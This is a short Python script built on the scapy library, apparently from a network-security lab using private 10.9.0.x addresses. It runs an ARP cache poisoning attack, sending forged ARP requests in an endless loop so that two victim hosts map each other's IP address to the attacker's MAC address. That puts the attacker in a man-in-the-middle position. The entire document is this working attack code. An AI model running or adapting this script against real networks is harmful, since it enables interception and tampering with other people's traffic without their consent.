#!/usr/bin/python3

from scapy.all import *
import time

IP_V1 = "10.9.0.5"
IP_V2 = "10.9.0.6"
IP_T = "10.9.0.105"

MAC_V = "02:42:0a:09:00:05"
MAC_T = "02:42:0a:09:00:69"

def create_req_packet(ip_a, mac_a, ip_v):
    ether = Ether(src=mac_a, dst="ff:ff:ff:ff:ff:ff")
    arp = ARP(psrc=ip_a, hwsrc=mac_a, pdst=ip_v)
    arp.op = 1

    frame = ether/arp

    return frame

while True:
    # Case 1: Poison Machine A
    print("Spoofing Machine A")
    frame1 = create_req_packet(IP_V1, MAC_T, IP_V2)
    sendp(frame1)

    # Case 2: Poison Machine B
    print("Spoofing Machine B")
    frame2 = create_req_packet(IP_V2, MAC_T, IP_V1)
    sendp(frame2)

    print("Wait...")
    time.sleep(5)


